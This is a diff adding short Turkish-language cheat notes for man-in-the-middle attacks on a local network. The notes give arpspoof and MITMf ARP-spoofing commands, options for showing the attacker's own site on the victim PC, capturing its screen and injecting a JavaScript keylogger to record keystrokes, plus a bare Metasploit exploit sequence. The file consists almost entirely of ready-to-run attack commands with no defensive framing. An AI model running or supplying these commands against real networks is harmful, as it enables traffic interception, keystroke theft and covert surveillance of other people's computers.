@@ -1,0 +1,37 @@
+Ortadaki Adam Saldýrýsý
+
+arpspoof -i eth0 -t 10.0.2.1 10.0.2.4
+
+MÝTMF
+
+mitmf --arp --spoof --gateway 10.0.2.4 --targets 10.0.2.1 -i eth0 
+
+hata alýrsan
+rm - f /usr/share/mitmf/plugins/filepwn.py
+
+Saldýrý anlama
+
+arp -a
+
+Karþý Pc de Kendi Sitemizi Gösterme
+
+leafpad /etc/mitmf/mitmf.conf
+apache2 start // service apache2 start
+
+
+Karþý Pc de SS Almak
+
+mitmf --arp --spoof --gateway 10.0.2.4 --targets 10.0.2.1 -i eth0 --screen
+
+Bastýðý Tuþlarý Görmek
+
+mitmf --arp --spoof --gateway 10.0.2.4 --targets 10.0.2.1 -i eth0 --jskeylogger
+
+MSF Console
+
+msfconsole
+use ...
+show options
+set RHOST 10.0.2.4
+show options
+exploit
